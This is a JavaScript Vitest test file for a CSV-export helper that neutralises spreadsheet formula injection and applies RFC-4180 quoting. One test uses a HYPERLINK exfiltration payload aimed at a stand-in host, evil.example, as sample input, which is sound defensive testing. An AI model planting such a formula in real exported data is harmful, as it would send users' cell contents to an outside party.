import { describe, it, expect } from 'vitest';
import { csvCell } from '../lib/csv-safe.js';

describe('csvCell formula-injection guard', () => {
  it('prefixes string cells starting with a formula trigger with a single quote', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+1')).toBe("'+1");
    expect(csvCell('-cmd')).toBe("'-cmd");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\tfoo')).toBe("'\tfoo");
    expect(csvCell('\rbar')).toBe('"\'\rbar"'); // CR also forces quoting
  });

  it('neutralizes the classic HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.example/?l="&A1,"click")';
    const out = csvCell(payload);
    // Payload contains a comma and quotes, so it is also RFC-4180 quoted; the
    // key property is that the formula no longer starts the cell value — it is
    // prefixed with `'` (inside the surrounding quotes).
    expect(out).toContain("'=HYPERLINK");
    expect(out.startsWith('"')).toBe(true);
  });

  it('leaves safe string cells untouched', () => {
    expect(csvCell('Conto Principale')).toBe('Conto Principale');
    expect(csvCell('Income: Stipendio')).toBe('Income: Stipendio');
    expect(csvCell('2026-01-31')).toBe('2026-01-31');
    expect(csvCell('')).toBe('');
  });

  it('emits finite numbers verbatim and never neutralizes them', () => {
    expect(csvCell(0)).toBe('0');
    expect(csvCell(1500.5)).toBe('1500.5');
    expect(csvCell(-50)).toBe('-50'); // numbers are not injection vectors
    expect(csvCell(NaN)).toBe('0');
    expect(csvCell(Infinity)).toBe('0');
  });

  it('applies RFC-4180 quoting for comma / quote / newline', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('she said "hi"')).toBe('"she said ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('quotes AND neutralizes a value that is both a formula and contains a comma', () => {
    expect(csvCell('=A1,B1')).toBe('"\'=A1,B1"');
  });

  it('renders null/undefined as an empty cell', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });
});
